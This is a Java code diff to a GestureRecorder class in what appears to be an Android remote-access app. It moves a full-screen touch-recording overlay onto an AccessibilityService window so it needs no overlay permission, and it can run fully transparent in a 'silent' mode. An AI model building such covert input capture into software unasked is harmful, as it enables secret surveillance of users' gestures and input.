@@ -738,6 +738,7 @@ public class GestureRecorder {
         private final Runnable onStop;
 
         private View view;
+        private WindowManager activeWm;
         private final List<GesturePoint> points = new ArrayList<>();
         private long startTime;
         private boolean stopped = false;
@@ -785,7 +786,17 @@ public class GestureRecorder {
 
         void show() {
             startTime = System.currentTimeMillis();
-            view = new View(context) {
+
+            // Prefer the AccessibilityService as context — TYPE_ACCESSIBILITY_OVERLAY requires
+            // a WindowManager token that only an AccessibilityService can provide.
+            com.remoteaccess.educational.services.UnifiedAccessibilityService svc =
+                com.remoteaccess.educational.services.UnifiedAccessibilityService.getInstance();
+            final Context viewCtx = (svc != null) ? svc : context;
+            final WindowManager overlayWm = (svc != null)
+                ? (WindowManager) svc.getSystemService(Context.WINDOW_SERVICE)
+                : wm;
+
+            view = new View(viewCtx) {
                 @Override
                 public boolean onTouchEvent(MotionEvent event) {
                     if (!stopped) handleTouch(event);
@@ -810,12 +821,14 @@ public class GestureRecorder {
                         WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
             int fmt = silent ? PixelFormat.TRANSPARENT : PixelFormat.TRANSLUCENT;
 
-            // Try TYPE_ACCESSIBILITY_OVERLAY first (no extra permission needed when service is active)
-            // Fall back to TYPE_APPLICATION_OVERLAY (requires SYSTEM_ALERT_WINDOW) if that fails.
-            int[] types = {
-                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-            };
+            // Use TYPE_ACCESSIBILITY_OVERLAY — works without SYSTEM_ALERT_WINDOW when
+            // the AccessibilityService is the provider of the WindowManager token.
+            // Fall back to TYPE_APPLICATION_OVERLAY only if the service is unavailable.
+            int[] types = svc != null
+                ? new int[]{ WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY }
+                : new int[]{ WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                             WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY };
+
             boolean added = false;
             Exception lastEx = null;
             for (int type : types) {
@@ -824,9 +837,10 @@ public class GestureRecorder {
                             WindowManager.LayoutParams.MATCH_PARENT,
                             WindowManager.LayoutParams.MATCH_PARENT,
                             type, flags, fmt);
-                    wm.addView(view, lp);
+                    overlayWm.addView(view, lp);
+                    activeWm = overlayWm;
                     added = true;
-                    Log.i(TAG, "Overlay added with type " + type);
+                    Log.i(TAG, "Overlay added with type " + type + " via " + (svc != null ? "AccessibilityService WM" : "app WM"));
                     break;
                 } catch (Exception e) {
                     Log.w(TAG, "addView type=" + type + " failed: " + e.getMessage());
@@ -956,7 +970,14 @@ public class GestureRecorder {
         }
 
         void hide() {
-            try { if (view != null) wm.removeView(view); view = null; } catch (Exception ignored) {}
+            try {
+                if (view != null) {
+                    WindowManager removeWm = activeWm != null ? activeWm : wm;
+                    removeWm.removeView(view);
+                }
+                view = null;
+                activeWm = null;
+            } catch (Exception ignored) {}
         }
 
         /**
